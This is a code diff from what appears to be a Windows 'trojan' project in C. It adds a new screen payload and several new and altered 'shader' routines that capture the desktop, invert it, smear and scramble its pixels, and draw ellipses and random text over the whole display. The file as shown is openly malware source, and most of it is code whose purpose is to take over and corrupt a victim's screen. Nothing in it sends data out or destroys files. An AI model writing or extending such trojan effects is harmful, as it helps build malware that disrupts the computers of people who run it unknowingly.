@@ -176,6 +176,8 @@ void ExecutePayload(TROJAN_PAYLOAD payload, int nTime) {
 		ReleaseDC(NULL, hdcScreen);
 		DeleteObject(hdcScreen);
 	}
+	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
+	Sleep(100);
 }
 
 void Payload1(int t, HDC hdcScreen) {
@@ -366,6 +368,41 @@ void Payload9(int t, HDC hdcScreen) {
 	Sleep(50);
 }
 
+void Payload10(int t, HDC hdcScreen) {
+	POINT ptScreen = GetVirtualScreenPos();
+	SIZE szScreen = GetVirtualScreenSize();
+
+	t *= 30;
+
+	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
+
+	HDC hcdc = CreateCompatibleDC(hdcScreen);
+	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
+	SelectObject(hcdc, hBitmap);
+	Sleep(50);
+	BitBlt(hcdc, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, NOTSRCCOPY);
+	SelectObject(hdcScreen, CreatePatternBrush(hBitmap));
+
+	Ellipse(hdcScreen, t % szScreen.cx + 20, t % szScreen.cy + 20, t % szScreen.cx + t % 101 + 180, t % szScreen.cy + t % 101 + 180);
+	BitBlt(hcdc, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, NOTSRCCOPY);
+	SelectObject(hdcScreen, CreatePatternBrush(hBitmap));
+	Ellipse(hdcScreen, t % szScreen.cx + 10, t % szScreen.cy + 10, t % szScreen.cx + t % 101 + 190, t % szScreen.cy + t % 101 + 190);
+	Ellipse(hdcScreen, t % szScreen.cx, t % szScreen.cy, t % szScreen.cx + t % 101 + 200, t % szScreen.cy + t % 101 + 200);
+	BitBlt(hcdc, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, NOTSRCCOPY);
+	SelectObject(hdcScreen, CreatePatternBrush(hBitmap));
+	Ellipse(hdcScreen, t % szScreen.cx, t % szScreen.cy, t % szScreen.cx + t % 101 + 200, t % szScreen.cy + t % 101 + 200);
+
+	SetBkColor(hdcScreen, RGB(random() % 256, random() % 256, random() % 256));
+	SetTextColor(hdcScreen, RGB(random() % 256, random() % 256, random() % 256));
+
+	for (int i = 0; i < 5; i++) {
+		TextOut(hdcScreen, random() % szScreen.cx, random() % szScreen.cy, L"     ", 5);
+	}
+
+	DeleteObject(hcdc);
+	DeleteObject(hBitmap);
+}
+
 void ExecuteShader(TROJAN_SHADER shader, int nTime) {
 	int dwStartTime = Time;
 	HDC hdcScreen = GetDC(NULL);
@@ -401,6 +438,8 @@ void ExecuteShader(TROJAN_SHADER shader, int nTime) {
 
 	DeleteObject(hbmScreen);
 	DeleteDC(hdcTempScreen);
+	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
+	Sleep(100);
 }
 
 void Shader1(int t, int w, int h, PRGBQUAD prgbScreen) {
@@ -504,21 +543,48 @@ void Shader11(int t, int w, int h, PRGBQUAD prgbScreen) {
 void Shader12(int t, int w, int h, PRGBQUAD prgbScreen) {
 	PRGBQUAD prgbTemp = { 0 };
 	prgbTemp = prgbScreen;
-	for (int i = 0; i < h; i++) {
+	for (int i = 0; i < h / 2; i++) {
 		for (int j = 0; j < w; j++) {
-			prgbScreen[i * w + j].rgb = prgbTemp[(int)((float)(i * w + j) + (float)sqrt((2 * h * i - i * i))) % (w * h)].rgb;
+			prgbScreen[i * w + j].rgb = (prgbTemp[(int)((float)(i * w + j) + (float)sqrt((2 * (h / 2) * i - i * i))) % (w * h)].rgb * (t % 3 + 1)) % RGB(255, 255, 255);
 		}
 	}
-	Sleep(90);
+	for (int i = h / 2; i < h; i++) {
+		for (int j = 0; j < w; j++) {
+			prgbScreen[i * w + j].rgb = (prgbTemp[(int)((float)(i * w + j) + (float)sqrt((2 * (h / 2) * i - i * i))) % (w * h)].rgb * (t % 3 + 1)) % RGB(255, 255, 255);
+		}
+	}
+	Sleep(50);
 }
 
 void Shader13(int t, int w, int h, PRGBQUAD prgbScreen) {
+	PRGBQUAD prgbTemp = { 0 };
+	prgbTemp = prgbScreen;
+	for (int i = 0; i < h; i++) {
+		for (int j = 0; j < w; j++) {
+			prgbScreen[i * w + j].rgb = prgbTemp[(unsigned int)((float)(j * w + i) + (float)sqrt((2 * h * i - i * i))) % (w * h)].rgb;
+		}
+	}
+	Sleep(100);
+}
+
+void Shader14(int t, int w, int h, PRGBQUAD prgbScreen) {
+	PRGBQUAD prgbTemp = { 0 };
+	prgbTemp = prgbScreen;
+	for (int i = 0; i < h; i++) {
+		for (int j = 0; j < w; j++) {
+			prgbScreen[i * w + j].rgb = prgbTemp[(unsigned int)((float)(j * w + i) + (float)sqrt((unsigned int)(2 * h * j - j * j))) % (w * h)].rgb;
+		}
+	}
+	Sleep(100);
+}
+
+void Shader15(int t, int w, int h, PRGBQUAD prgbScreen) {
 	for (int i = 0; i < w * h; i++) {
 		prgbScreen[i].rgb = (t * i) % (RGB(255, 255, 255));
 	}
 }
 
-void Shader14(int t, int w, int h, PRGBQUAD prgbScreen) {
+void Shader16(int t, int w, int h, PRGBQUAD prgbScreen) {
 	for (int i = 0; i < w * h; i++) {
 		prgbScreen[i].rgb = (Xorshift32() % 0x100) * 0x010101;
 	}
